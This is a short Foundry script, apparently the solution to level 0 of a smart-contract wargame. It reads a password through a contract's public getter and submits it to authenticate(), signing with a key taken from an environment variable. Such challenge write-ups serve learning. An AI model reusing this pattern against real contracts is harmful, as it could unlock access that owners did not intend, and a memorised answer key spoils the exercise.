// SPDX-License-Identifier: MIT

pragma solidity ^0.8.16;

import "../instance/Level0.sol";
import "forge-std/Script.sol";

contract ExploitLevel00 is Script {
    ILevel0 level0 = ILevel0(0xdBF90CF9aC26b2E2737ED1305eff9CE6e65D7e23);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        string memory password = level0.password();
        level0.authenticate(password);

        vm.stopBroadcast();
    }
}
